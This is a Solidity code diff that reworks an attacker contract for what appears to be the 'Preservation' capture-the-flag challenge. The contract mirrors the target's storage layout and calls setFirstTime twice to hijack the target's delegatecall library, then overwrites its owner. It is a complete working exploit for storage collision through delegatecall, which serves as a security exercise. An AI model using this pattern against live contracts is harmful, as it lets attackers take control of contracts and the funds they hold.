@@ -6,26 +6,21 @@ interface IPreservation {
 }
 
 contract PreservationAttacker {
-    address public challengeInstance;
-    address public delegateInstance;
-
-    constructor(address _challengeInstance, address _delegateInstance) {
-        challengeInstance = _challengeInstance;
-        delegateInstance = _delegateInstance;
-    }
-
-    function attack() external {
-        IPreservation(challengeInstance).setFirstTime(uint256(uint160(delegateInstance)));
-        IPreservation(challengeInstance).setFirstTime(uint256(uint160(msg.sender)));
-    }
-}
-
-contract PreservationDelegator {
     address public variable1;
     address public variable2;
     address public owner;
+    address public challengeInstance;
+
+    constructor(address _challengeInstance) {
+        challengeInstance = _challengeInstance;
+    }
+
+    function attack() external {
+        IPreservation(challengeInstance).setFirstTime(uint256(uint160(address(this))));
+        IPreservation(challengeInstance).setFirstTime(uint256(uint160(msg.sender)));
+    }
 
     function setTime(uint _timeStamp) external {
-        owner = address(bytes20(uint160(_timeStamp)));
+        owner = address(uint160(_timeStamp));
     }
 }
